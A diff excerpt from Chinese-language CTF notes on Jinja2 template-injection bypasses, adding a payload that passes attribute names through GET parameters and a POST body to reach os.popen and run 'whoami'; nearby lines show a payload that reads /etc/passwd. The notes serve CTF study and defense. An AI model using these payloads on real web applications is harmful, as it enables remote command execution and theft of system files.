@@ -282,6 +282,13 @@ py2有个特殊的`commands`模块也可以直接rce
   {{''[request.args.class][request.args.base][request.args.subclasses]()[index]('/etc/passwd').read() }}&class=__class__&base=__base__&subclasses=__subclasses__
   ```
 
+  这种方式可以结合get和post，举例->[[CTFshow 击剑杯]通关大佬](https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr)，在不同的字段处对传入参数的限制是不同的
+
+  ```
+  /edit?a=__init__&b=__globals__&c=__getitem__&d=os&e=popen&f=whoami&g=read
+  POST: name={%25set%20r=request.args%25}&rank=1&speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&time=2021年11月11日
+  ```
+
 - 按字符串的方式走，也可
 
 ### 过滤`{`
